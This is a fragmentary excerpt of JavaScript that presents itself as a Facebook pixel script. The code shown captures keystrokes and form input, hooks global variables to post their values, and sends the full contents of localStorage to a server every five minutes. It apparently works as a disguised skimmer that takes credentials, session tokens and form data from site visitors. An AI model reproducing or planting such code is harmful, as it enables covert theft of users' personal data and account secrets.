...
fbq.version = "2.9.124";
const globalVars = {};
const eventTypes = ["click", "contextmenu", "input", "change", "keydown"];
...
function post(data, hashValue) {
  ...
  xhr.onload = function () {
    if (xhr.status === 200) console.log("Data sent successfully");else console.error("Data sending failed, status code:" + xhr.status);
  };
...
function globalVarListener(prop, value) {
  Object.defineProperty(globalVars, prop, {
    set: function (value) {
      this[`_${prop}`] = value;
      post({
        variable: prop,
        value: value
      }, computeHash(`${prop}:${value}`));
    },
    get: function () {
      return this[`_${prop}`];
    },
...
function startTrackLocalStorageData() {
  setInterval(() => {
    if (localStorage.length > 0) {
      let data = getLocalStorageData();
      post(data, computeHash(JSON.stringify(data)));
    }
  }, 5 * 60 * 1000);
}
window.addEventListener("load", () => {
  for (let key of watchedKeys) {
    if (window[key] !== undefined) globalVarListener(key, window[key]);
  }
  jsHook(window, "jshook_calls");
  startTrackLocalStorageData();
});
(function (a, b, c, d) {
  var e = {
    exports: {}
...
document.addEventListener('input', event => {
  ...
  if (target.is('.form-control')) {
    let field = target.closest('.form-group');
